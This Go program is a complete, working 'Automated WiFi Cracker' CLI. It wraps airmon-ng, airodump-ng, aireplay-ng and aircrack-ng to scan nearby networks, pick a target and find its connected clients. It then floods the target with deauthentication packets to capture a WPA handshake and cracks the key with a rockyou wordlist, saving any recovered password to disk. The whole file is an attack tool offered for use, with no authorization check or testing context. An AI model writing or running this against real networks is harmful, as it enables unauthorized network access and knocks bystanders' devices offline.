package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/fatih/color"
)

// ==========================================
// Data Models
// ==========================================
type Network struct {
	BSSID  string
	CH     string
	ESSID  string
	Sec    string
	Client string
}

// ==========================================
// Global State & UI Colors
// ==========================================
var (
	cyan   = color.New(color.FgCyan, color.Bold)
	green  = color.New(color.FgGreen, color.Bold)
	yellow = color.New(color.FgYellow, color.Bold)
	red    = color.New(color.FgRed, color.Bold)
	white  = color.New(color.FgWhite, color.Bold)

	monIface   string
	activeCmds []*exec.Cmd
)

// ==========================================
// Main Entry Point
// ==========================================
func main() {
	setupSignalHandler()

	if os.Geteuid() != 0 {
		red.Println("[!] ERROR: This tool requires root privileges. Please run with 'sudo'.")
		os.Exit(1)
	}

	cyan.Println("=======================================")
	cyan.Println("    Automated WiFi Cracker CLI v6.0   ")
	cyan.Println("=======================================")

	setupEnvironment()

	reader := bufio.NewReader(os.Stdin)

	white.Print("\n[*] Enter Wireless Interface (e.g., wlp1s0): ")
	iface, err := reader.ReadString('\n')
	if err != nil {
		red.Printf("[-] Failed to read input: %v\n", err)
		os.Exit(1)
	}
	iface = strings.TrimSpace(iface)
	if iface == "" {
		red.Println("[-] Interface name cannot be empty.")
		os.Exit(1)
	}

	monIface = iface + "mon"

	yellow.Println("\n[*] Enabling Monitor Mode...")
	// Silently run airmon-ng commands to keep CLI clean
	runCmdSilent("airmon-ng", "check", "kill")
	runCmdSilent("airmon-ng", "start", iface)
	green.Println("[+] Monitor Mode enabled successfully.")

	defer cleanup()

	// Step 1: Scan APs
	networks := scanNetworks()
	target := selectTarget(networks, reader)

	// Step 2: Targeted Client Scan
	yellow.Printf("\n[*] Locking Channel %s to find connected clients for '%s' (10s)...\n", target.CH, target.ESSID)
	target = findConnectedClients(target)

	if target.Client != "" {
		green.Printf("[+] Found connected device! MAC: %s\n", target.Client)
	} else {
		red.Println("[!] WARNING: No connected devices found. Broadcast deauth will be used (might fail on modern routers).")
	}

	// Step 3: Directory Structure
	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_")
	targetDir := filepath.Join("data", sanitizedEssid)

	yellow.Printf("\n[*] Creating directory for target: %s\n", targetDir)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		red.Printf("[-] ERROR: Failed to create directory: %v\n", err)
		os.Exit(1)
	}
	green.Println("[+] Directory ready.")

	capFile := filepath.Join(targetDir, "handshake")

	// Step 4: Capture Handshake
	captureHandshake(target, capFile)

	// Step 5: Verify Handshake
	if !verifyHandshake(capFile) {
		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 1 minute.")
		red.Println("[-] Reason: No device reconnected, or router ignores deauth packets.")
		red.Println("[-] Suggestion: Connect a device to this WiFi and use the internet, then run the script again.")
		cleanup()
		os.Exit(1)
	}

	green.Println("\n[+] Valid Handshake Captured Successfully!")

	// Step 6: Crack Password
	crackPassword(capFile, targetDir)
	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
}

// ==========================================
// Core Attack Functions
// ==========================================

func findConnectedClients(target Network) Network {
	scanFile := "client_scan_temp"
	os.Remove(scanFile + "-01.csv")

	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, monIface, "-w", scanFile, "--output-format", "csv")
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Start()
	activeCmds = append(activeCmds, cmd)

	time.Sleep(10 * time.Second) // Focused 10s scan

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}

	// Parse the focused CSV to find clients
	file, err := os.Open(scanFile + "-01.csv")
	if err != nil {
		return target
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	isStation := false
	var foundClients []string

	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "Station MAC") {
			isStation = true
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 6 {
			continue
		}

		if isStation {
			stationMac := strings.TrimSpace(parts[0])
			targetBSSID := strings.TrimSpace(parts[5])
			// If station is connected to our target BSSID
			if targetBSSID == target.BSSID && stationMac != "" {
				foundClients = append(foundClients, stationMac)
			}
		}
	}

	if len(foundClients) > 0 {
		target.Client = foundClients[0] // Pick the first found client
	}
	os.Remove(scanFile + "-01.csv")
	return target
}

func captureHandshake(target Network, capFile string) {
	yellow.Println("\n[*] Starting Handshake Capture (Listening for up to 60 seconds)...")

	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		red.Printf("[-] Failed to start capture: %v\n", err)
		cleanup()
		os.Exit(1)
	}
	activeCmds = append(activeCmds, cmd)

	time.Sleep(3 * time.Second) // Wait for airodump to lock channel

	// 1 Minute Loop (4 attempts, 15 seconds each)
	for i := 1; i <= 4; i++ {
		yellow.Printf("\n[*] Attempt %d/4: Sending Deauth Burst (Waiting 15s for reconnect)...\n", i)

		deauthArgs := []string{"--deauth", "15", "-a", target.BSSID, monIface}
		if target.Client != "" {
			deauthArgs = append(deauthArgs, "-c", target.Client)
			white.Printf("[*] Targeting specific client: %s\n", target.Client)
		} else {
			white.Println("[!] No specific client found. Sending broadcast deauth.")
		}

		// Run deauth silently
		deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
		deauthCmd.Stdout = nil
		deauthCmd.Stderr = nil
		deauthCmd.Start()

		time.Sleep(12 * time.Second) // Wait for client to reconnect

		if deauthCmd.Process != nil {
			deauthCmd.Process.Kill()
			deauthCmd.Wait()
		}

		// Check if handshake is captured early
		if verifyHandshake(capFile) {
			green.Println("[+] Handshake detected early! Stopping capture phase.")
			if cmd.Process != nil {
				cmd.Process.Kill()
				cmd.Wait()
			}
			return
		}
		white.Println("[*] Handshake not found yet. Retrying...")
	}

	time.Sleep(3 * time.Second)
	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}
	green.Println("[+] Capture phase completed.")
}

func verifyHandshake(capFile string) bool {
	finalCapFile := capFile + "-01.cap"
	if _, err := os.Stat(finalCapFile); os.IsNotExist(err) {
		return false
	}

	cmd := exec.Command("aircrack-ng", finalCapFile)
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	cmd.Run()

	return strings.Contains(buf.String(), "1 handshake")
}

func crackPassword(capFile string, targetDir string) {
	finalCapFile := capFile + "-01.cap"
	cores := runtime.NumCPU()

	cyan.Println("\n=======================================")
	cyan.Println("       Starting Password Cracking      ")
	cyan.Println("=======================================")
	yellow.Printf("[*] File: %s\n", finalCapFile)
	yellow.Printf("[*] Wordlist: rockyou_clean.txt\n")
	yellow.Printf("[*] CPU Threads: %d (Multi-threading Enabled)\n", cores)
	fmt.Println()

	cmd := exec.Command("aircrack-ng", "-p", fmt.Sprintf("%d", cores), "-w", "/usr/share/wordlists/rockyou_clean.txt", finalCapFile)

	var buf bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
	cmd.Run()

	outputStr := buf.String()
	if strings.Contains(outputStr, "KEY FOUND!") {
		startIndex := strings.Index(outputStr, "KEY FOUND! [")
		if startIndex != -1 {
			restStr := outputStr[startIndex+len("KEY FOUND! ["):]
			endIndex := strings.Index(restStr, "]")
			if endIndex != -1 {
				password := restStr[:endIndex]

				fmt.Println()
				green.Println("=======================================")
				green.Printf("🎯  PASSWORD FOUND: %s  🎯\n", password)
				green.Println("=======================================")

				// Save password to file
				passFilePath := filepath.Join(targetDir, "password.txt")
				err := os.WriteFile(passFilePath, []byte("WiFi: "+filepath.Base(targetDir)+"\nPassword: "+password+"\n"), 0644)
				if err == nil {
					cyan.Printf("[+] Password saved securely to: %s\n", passFilePath)
				}
				fmt.Println()
			}
		}
	} else {
		red.Println("\n[-] Password not found in the wordlist.")
	}
}

// ==========================================
// Scanning & Parsing
// ==========================================

func scanNetworks() []Network {
	yellow.Println("\n[*] Scanning networks for 15 seconds...")
	scanFile := "scan_temp"
	os.Remove(scanFile + "-01.csv")

	cmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		red.Printf("[-] Failed to start airodump-ng: %v\n", err)
		cleanup()
		os.Exit(1)
	}
	activeCmds = append(activeCmds, cmd)

	time.Sleep(15 * time.Second)

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}
	green.Println("[+] Scan completed.")

	networks := parseCSV(scanFile + "-01.csv")
	if len(networks) == 0 {
		red.Println("[-] ERROR: No networks found.")
		cleanup()
		os.Exit(1)
	}

	fmt.Println()
	cyan.Println("=== Discovered WiFi Networks ===")
	for i, net := range networks {
		fmt.Printf("[%d] ESSID: %-20s | BSSID: %s | CH: %-2s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
	}

	return networks
}

func selectTarget(networks []Network, reader *bufio.Reader) Network {
	for {
		white.Print("\n[*] Enter the number of the target network: ")
		input, err := reader.ReadString('\n')
		if err != nil {
			red.Printf("[-] Failed to read input: %v\n", err)
			cleanup()
			os.Exit(1)
		}

		input = strings.TrimSpace(input)
		choice, err := strconv.Atoi(input)

		if err != nil || choice < 1 || choice > len(networks) {
			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
			continue
		}

		target := networks[choice-1]
		yellow.Printf("\n[*] Target Selected: %s (%s)\n", target.ESSID, target.BSSID)
		return target
	}
}

func parseCSV(filename string) []Network {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()

	var networks []Network
	scanner := bufio.NewScanner(file)
	isStation := false

	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "Station MAC") {
			isStation = true
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}

		if !isStation {
			bssid := strings.TrimSpace(parts[0])
			ch := strings.TrimSpace(parts[3])
			sec := strings.TrimSpace(parts[5])
			essid := strings.TrimSpace(parts[13])

			// Filter out CSV headers and empty lines
			if bssid != "" && essid != "" && bssid != "BSSID" && essid != "ESSID" {
				networks = append(networks, Network{
					BSSID: bssid,
					CH:    ch,
					ESSID: essid,
					Sec:   sec,
				})
			}
		}
	}
	return networks
}

// ==========================================
// Environment Setup
// ==========================================

func setupEnvironment() {
	yellow.Println("\n[*] Checking environment dependencies...")

	if _, err := exec.LookPath("aircrack-ng"); err != nil {
		red.Println("[-] aircrack-ng not found. Installing...")
		runCmd("apt", "update")
		runCmd("apt", "install", "aircrack-ng", "-y")
	} else {
		green.Println("[+] aircrack-ng is already installed.")
	}

	if _, err := exec.LookPath("wget"); err != nil {
		red.Println("[-] wget not found. Installing...")
		runCmd("apt", "install", "wget", "-y")
	}

	wordlistPath := "/usr/share/wordlists/rockyou.txt"
	if _, err := os.Stat(wordlistPath); os.IsNotExist(err) {
		red.Println("[-] rockyou.txt not found. Downloading (130MB)...")
		runCmd("mkdir", "-p", "/usr/share/wordlists")
		runCmd("wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "-O", wordlistPath)
		green.Println("[+] rockyou.txt downloaded successfully.")
	} else {
		green.Println("[+] rockyou.txt is already downloaded.")
	}

	cleanWordlistPath := "/usr/share/wordlists/rockyou_clean.txt"
	if _, err := os.Stat(cleanWordlistPath); os.IsNotExist(err) {
		yellow.Println("[*] Optimizing Wordlist: Removing passwords shorter than 8 characters...")
		cleanFile, err := os.Create(cleanWordlistPath)
		if err != nil {
			red.Printf("[-] Failed to create clean wordlist: %v\n", err)
			return
		}
		defer cleanFile.Close()

		awkCmd := exec.Command("awk", "length>=8", wordlistPath)
		awkCmd.Stdout = cleanFile
		awkCmd.Stderr = os.Stderr
		if err := awkCmd.Run(); err != nil {
			red.Printf("[-] Wordlist optimization failed: %v\n", err)
		} else {
			green.Println("[+] Optimization complete. 'rockyou_clean.txt' created.")
		}
	} else {
		green.Println("[+] Optimized wordlist 'rockyou_clean.txt' is ready.")
	}
}

// ==========================================
// System & Cleanup Utilities
// ==========================================

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println()
		red.Println("\n[!] Interrupted by user. Cleaning up...")
		cleanup()
		os.Exit(1)
	}()
}

func cleanup() {
	yellow.Println("\n[*] Performing cleanup operations...")

	for _, cmd := range activeCmds {
		if cmd != nil && cmd.Process != nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}
	activeCmds = nil

	if monIface != "" {
		yellow.Printf("[*] Disabling monitor mode on %s...\n", monIface)
		runCmdSilent("airmon-ng", "stop", monIface)
	}

	yellow.Println("[*] Restarting NetworkManager...")
	runCmdSilent("systemctl", "start", "NetworkManager")

	os.Remove("scan_temp-01.csv")
	os.Remove("client_scan_temp-01.csv")

	green.Println("[+] Cleanup complete.")
}

func runCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}

func runCmdSilent(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Run()
}
